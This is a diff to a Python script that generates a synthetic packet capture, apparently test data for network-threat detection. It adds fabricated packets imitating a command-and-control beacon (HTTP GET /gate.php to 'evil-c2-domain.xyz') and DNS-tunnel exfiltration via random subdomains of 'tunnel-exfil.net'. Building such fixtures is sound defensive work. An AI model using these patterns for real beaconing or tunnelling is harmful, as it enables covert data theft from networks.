@@ -23,6 +23,23 @@ def _eth_ip_tcp(src_ip, dst_ip, sport, dport, payload=b"", flags=0x18):
     return eth + ip + tcp
 
 
+def _eth_ip_udp(src_ip, dst_ip, sport, dport, payload=b""):
+    def ip_bytes(ip):
+        return bytes(int(o) for o in ip.split("."))
+    eth = b"\xaa\xbb\xcc\xdd\xee\xff" + b"\x11\x22\x33\x44\x55\x66" + b"\x08\x00"
+    udp = struct.pack(">HHHH", sport, dport, 8 + len(payload), 0) + payload
+    total = 20 + len(udp)
+    ip = struct.pack(">BBHHHBBH", 0x45, 0, total, 1, 0, 64, 17, 0) + ip_bytes(src_ip) + ip_bytes(dst_ip)
+    return eth + ip + udp
+
+
+def _dns_query(name: str) -> bytes:
+    q = b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+    for label in name.split("."):
+        q += bytes([len(label)]) + label.encode()
+    return q + b"\x00\x00\x01\x00\x01"
+
+
 def write_pcap():
     path = OUT / "beaconing.pcap"
     records = []
@@ -40,6 +57,18 @@ def write_pcap():
     # Port scan: one src hits many ports on a target
     for port in range(20, 60):
         records.append((base + 2000 + port * 0.1, _eth_ip_tcp("192.168.1.77", "192.168.1.10", 60000, port, b"", flags=0x02)))
+    # Cleartext HTTP with a script User-Agent to a suspicious host
+    http_req = (b"GET /gate.php HTTP/1.1\r\nHost: evil-c2-domain.xyz\r\n"
+                b"User-Agent: python-requests/2.31\r\nAccept: */*\r\n\r\n")
+    for i in range(4):
+        records.append((base + 2200 + i, _eth_ip_tcp("192.168.1.50", "45.133.1.99", 52000 + i, 80, http_req)))
+    # DNS tunneling: many long, high-entropy subdomains under one parent
+    import random as _r
+    _r.seed(7)
+    for i in range(40):
+        sub = "".join(_r.choice("abcdef0123456789") for _ in range(28))
+        records.append((base + 2400 + i, _eth_ip_udp("192.168.1.50", "8.8.8.8", 40000 + i, 53,
+                       _dns_query(f"{sub}.tunnel-exfil.net"))))
 
     records.sort(key=lambda r: r[0])
     with path.open("wb") as f:
